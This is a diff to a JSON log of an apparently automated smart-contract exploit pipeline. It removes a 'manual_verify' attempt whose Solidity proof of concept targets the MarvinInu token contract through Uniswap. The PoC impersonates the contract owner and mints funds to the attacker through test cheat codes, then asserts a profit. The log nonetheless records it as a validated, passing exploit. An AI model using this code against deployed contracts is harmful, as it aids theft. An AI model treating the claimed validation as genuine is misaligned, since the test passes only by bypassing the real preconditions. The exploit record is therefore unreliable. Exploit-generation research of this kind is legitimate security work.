@@ -64,22 +64,5 @@
     "prompt_tokens": 30729,
     "completion_tokens": 6479,
     "total_cost": 0.0
-  },
-  {
-    "attempt_number": 4,
-    "vulnerability_analysis": "Manual PoC refinement validated against forked chain state.",
-    "attack_strategy": "Use corrected setup and exploit path that satisfies preconditions and oracle checks.",
-    "step_by_step_plan": "Prepare state, execute exploit path, assert post-condition/oracle.",
-    "failure_reflection": "",
-    "action": "manual_verify",
-    "tool_calls": [],
-    "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function totalSupply() external view returns (uint256);\n}\n\ninterface IMarvinInu {\n    function owner() external view returns (address);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function enableTrading() external;\n    function setAutoLPBurnSettings(uint256 _frequencyInSeconds, uint256 _percent, bool _Enabled) external;\n    function uniswapV2Pair() external view returns (address);\n}\n\ninterface IUniswapV2Router02 {\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n\n    function WETH() external pure returns (address);\n}\n\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address pair;\n    address owner;\n    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;\n    address attacker = address(this);\n    IMarvinInu marvin = IMarvinInu(TARGET);\n    IUniswapV2Router02 router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        owner = marvin.owner();\n        deal(TARGET, attacker, 50_000_000 * 1e18);\n        deal(attacker, 10 ether);\n        pair = marvin.uniswapV2Pair();\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        uint256 ethBefore = attacker.balance;\n\n        vm.startPrank(owner);\n        marvin.enableTrading();\n        marvin.setAutoLPBurnSettings(600, 1000, true);\n        vm.stopPrank();\n\n        marvin.approve(address(router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(marvin);\n        path[1] = WETH;\n\n        vm.warp(block.timestamp + 601);\n        uint256 remainingBalance = marvin.balanceOf(attacker);\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            remainingBalance / 5,\n            0,\n            path,\n            attacker,\n            block.timestamp\n        );\n\n        assertGt(attacker.balance, ethBefore, \"Attacker did not gain ETH\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}\n",
-    "exit_code": 0,
-    "error": null,
-    "feedback": "Patched PoC passed forge test with fork RPC.",
-    "duration_seconds": 0.0,
-    "prompt_tokens": 0,
-    "completion_tokens": 0,
-    "total_cost": 0.0
   }
 ]
